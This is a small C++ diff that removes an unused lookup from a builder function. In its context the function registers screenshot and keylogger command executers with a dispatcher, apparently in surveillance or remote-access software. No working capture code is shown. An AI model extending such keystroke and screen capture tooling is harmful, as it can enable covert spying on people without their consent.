@@ -21,11 +21,8 @@ utils::builders::BuildManager()
 {
     command::CommandManager *dispatcher = new command::CommandManager();
 
-    command::ICommandExecuter* a = dispatcher->Find(0);
-
     dispatcher->Add(BuildScreenshotExecuter());
     dispatcher->Add(BuildKeyloggerExecuter());
-
 
     return ( dispatcher );
 }
